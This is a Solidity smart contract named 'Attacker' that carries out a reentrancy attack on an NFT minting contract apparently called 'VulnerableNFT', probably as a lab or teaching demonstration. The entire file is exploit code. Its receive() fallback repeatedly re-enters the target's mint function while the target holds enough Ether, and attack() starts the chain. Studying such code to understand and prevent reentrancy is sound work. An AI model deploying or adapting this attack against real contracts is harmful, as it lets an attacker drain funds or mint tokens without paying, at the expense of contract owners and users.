// SPDX-License-Identifier: MIT
pragma solidity ^0.8.9;
contract Attacker {
    IVulnerableNFT public vulnerableNft;

    constructor(address _vulnerableNft) {
        vulnerableNft = IVulnerableNFT(_vulnerableNft);
    }

    // Fallback function used to trigger reentrancy
    receive() external payable {
        if (address(vulnerableNft).balance >= vulnerableNft.mintPrice()) {
            vulnerableNft.mint(1);
        }
    }

    function attack() external payable {
        require(msg.value >= vulnerableNft.mintPrice(), "Not enough Ether sent.");
        vulnerableNft.mint{value: msg.value}(1);
    }
}

interface IVulnerableNFT {
    function mint(uint256 numberOfTokens) external payable;
    function nextTokenId() external view returns (uint256);
    function mintPrice() external view returns (uint256);
}